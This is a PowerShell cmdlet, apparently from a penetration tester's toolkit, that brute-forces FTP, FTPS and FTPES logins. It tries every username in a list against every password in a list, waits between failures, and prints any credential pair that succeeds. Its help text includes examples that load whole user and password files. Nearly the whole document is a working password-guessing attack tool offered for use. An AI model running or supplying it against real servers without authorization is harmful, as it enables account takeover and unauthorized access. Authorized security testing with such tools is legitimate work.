Function Test-FTPCredential {
<#
.SYNOPSIS
This cmdlet is used to brute force FTP Credentials


.DESCRIPTION
Test a list of usernames and passwords against an FTP server


.PARAMETER Server
Defines the FQDN, hostname, or IP address of the server hosting the FTP instance

.PARAMETER Username
Defines a username to test passwords against

.PARAMETER Passwd
Defines the passwords you want tested against the username you define

.PARAMETER Port
Defines the port the FTP server is listening on. The default value is 21

.PARAMETER Protocol
Defines the FTP Protocol you wish to issue authentication attempts against. The default value is FTP

.PARAMETER Seconds
Defines the number of seconds to wait in between failed password attempts


.EXAMPLE
Test-FTPCredential -Server FTP.domian.com -Username ftpuser -Passwd 'Password123','Passw0rd1!','password123!' -Port 21
# This example tests the 3 defined passwords against the ftpuser account on the FTP server located on FTP.domain.com over port 21

.EXAMPLE
Test-FTPCredential -Server FTP.domian.com -Username admin, ftpuser -Passwd 'Password123','Passw0rd1!','password123!' -Seconds 60
# This example tests the 3 defined passwords against the admin and ftpuser account on the FTP server located on FTP.domain.com over port 21, waiting 60 seconds in between failed attempts

.EXAMPLE
Test-FTPCredential -Server FTP.domian.com -Username (Get-Content -Path C:\Temp\userlist.txt) -Passwd (Get-Content -Path C:\Temp\passlist.txt)
# This example tests the passwords in C:\Temp\passlist.txt against all users defined in C:\Temp\userlist.txt file against the FTP server located at FTP.domain.com over port 21, waiting 1 seconds in between failed attempts


.NOTES
Author: Robert H. Osborne
Alias: tobor
Contact: rosborne@osbornepro.com


.LINK
https://osbornepro.com
https://writeups.osbornepro.com
https://encrypit.osbornepro.com
https://btpssecpack.osbornepro.com
https://github.com/tobor88
https://github.com/OsbornePro
https://gitlab.com/tobor88
https://www.powershellgallery.com/profiles/tobor
https://www.linkedin.com/in/roberthosborne/
https://www.credly.com/users/roberthosborne/badges
https://www.hackthebox.eu/profile/52286


.INPUTS
None


.OUTPUTS
None
#>
    [CmdletBinding()]
        param(
            [Parameter(
                Position=0,
                Mandatory=$True,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Define the hostname, FQDN, or IP address of the FTP server. `n[E] ftp.domain.com")]  # End Parameter
            [String]$Server,

            [Parameter(
                Position=1,
                Mandatory=$True,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Define the username you wish to attempt authentication on. `n[E] domain\\ftpuser")]  # End Parameter
            [String[]]$Username,

            [Parameter(
                Position=2,
                Mandatory=$True,
                ValueFromPipeline=$False,
                HelpMessage="`n[H] Define the passwords you wish to attempt authentication with. `n[E] 'Passw0rd1!','Password123!'")]  # End Parameter
            [String[]]$Passwd,

            [Parameter(
                Position=3,
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [UInt16]$Port = 21,

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [ValidateSet('FTP','FTPS','FTPES')]
            [String]$Protocol = 'FTP',

            [Parameter(
                Mandatory=$False,
                ValueFromPipeline=$False)]  # End Parameter
            [Int32]$Seconds = 1

        )  # End param

    Write-Output -InputObject "[*] Brute Forcing FTP service on $Server"
    $Source = "ftp://" + $Server + ":" + $Port.ToString()

    Switch ($Protocol) {

        'FTP' {

            $Request = [System.Net.FtpWebRequest]::Create($Source)
            $Request.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails

        }  # End FTP Switch

        'FTPS' {

            $Request = [System.Net.FtpWebRequest]::Create($Source)
            $Request.UseBinary = $False
            $Request.UsePassive = $True
            $Request.EnableSsl = $True
            $Request.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails

        }  # End FTPS Switch

        'FTPES' {

            $Request = [System.Net.FtpWebRequest]::Create($Source)
            $Request.UseBinary = $False
            $Request.UsePassive = $True
            $Request.EnableSsl = $True
            $Request.Method = [System.Net.WebRequestMethods+Ftp]::ListDirectoryDetails

        }  # End FTPES Switch

    }  # End Switch


    ForEach ($U in $Username) {

        ForEach ($P in $Passwd) {

            Try {

                Write-Verbose -Message "Attempting $U : $P"

                $Request.Credentials = New-Object -TypeName System.Net.NetworkCredential($U, $P)
                $Result = $Request.GetResponse()
                $Message = $Result.BannerMessage + $Result.WelcomeMessage

                Write-Output -InputObject "[*] SUCCESS $U : $P"
                $Message
                $Obj = New-Object -TypeName PSCustomObject -Property @{Server=$Server; Username=$U; Password=$P; URI=$Source}
                $Obj
                Break

            } Catch {

                Write-Error -Message $Error[0]

            }  # End Catch

            Start-Sleep -Seconds $Seconds

        }  # End ForEach Passwd

    }  # End ForEach User

}  # End Function Test-FTPCredential
